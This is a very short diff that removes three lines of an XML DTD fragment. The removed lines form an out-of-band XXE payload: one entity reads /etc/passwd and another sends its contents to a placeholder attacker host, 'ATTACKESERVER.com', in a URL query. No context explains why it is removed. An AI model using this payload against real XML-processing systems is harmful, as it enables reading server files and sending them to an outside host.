@@ -1,3 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % all "<!ENTITY xxe SYSTEM 'http://ATTACKESERVER.com/?%file;'>">
-%all;
